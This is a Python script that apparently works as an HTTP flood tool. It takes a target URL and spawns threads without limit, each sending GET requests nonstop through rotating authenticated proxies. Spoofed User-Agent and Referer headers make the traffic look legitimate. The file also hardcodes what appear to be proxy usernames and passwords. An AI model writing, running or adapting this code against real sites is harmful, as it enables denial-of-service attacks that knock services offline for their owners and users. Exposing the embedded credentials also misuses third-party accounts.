import requests
import threading
import random
import time
from colorama import init, Back, Fore
from requests.auth import HTTPProxyAuth

# Initialize colorama
init(autoreset=True)

# List of proxies (format: ip:port:user:password)
proxies_list = [
    "185.244.107.85:12323:14ad36c842d9d:9ab5792976",
    "216.177.139.10:12323:14ad36c842d9d:9ab5792976",
    "72.14.132.172:12323:14ad36c842d9d:9ab5792976",
    "193.29.189.212:12323:14ad36c842d9d:9ab5792976",
    "2.59.59.50:12323:14ad36c842d9d:9ab5792976"
]

# List of common User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"
]

# List of popular Referers to make it look natural
referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.amazon.com/",
    "https://www.reddit.com/"
]

# Function to extract proxy credentials and return a proxy dictionary
def get_proxy_dict(proxy_str):
    proxy_parts = proxy_str.split(":")
    ip = proxy_parts[0]
    port = proxy_parts[1]
    username = proxy_parts[2]
    password = proxy_parts[3]
    
    proxy_url = f"http://{username}:{password}@{ip}:{port}"
    proxy_dict = {
        "http": proxy_url,
        "https": proxy_url
    }
    auth = HTTPProxyAuth(username, password)
    
    return proxy_dict, auth

# Function to make requests
def send_request(site_url):
    while True:
        try:
            # Randomly choose a proxy from the list
            proxy_str = random.choice(proxies_list)
            proxy_dict, auth = get_proxy_dict(proxy_str)

            # Randomly select a User-Agent and Referer
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)

            # Headers to simulate a more legitimate request
            headers = {
                "User-Agent": user_agent,
                "Referer": referer,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            }
            
            # Send request with proxy, authentication, and headers
            response = requests.get(site_url, proxies=proxy_dict, auth=auth, headers=headers, timeout=10)
            
            # Print result with colorama (white background, black text)
            print(f"{Back.WHITE}{Fore.BLACK}Request sent to {site_url} using proxy {proxy_str} | Status Code: {response.status_code}")
        except requests.RequestException as e:
            # Handle exceptions if request fails
            print(f"{Back.WHITE}{Fore.BLACK}Error occurred: {e}")

# Function to start threads
def start_threads():
    site_url = input(f"{Back.WHITE}{Fore.BLACK}Enter the site URL: ").strip()
    
    while True:
        # Create multiple threads that continuously send requests
        thread = threading.Thread(target=send_request, args=(site_url,))
        thread.daemon = True  # Allow thread to exit when main program exits
        thread.start() # Delay to prevent too many threads being created at once

# Start the script
if __name__ == "__main__":
    start_threads()
 
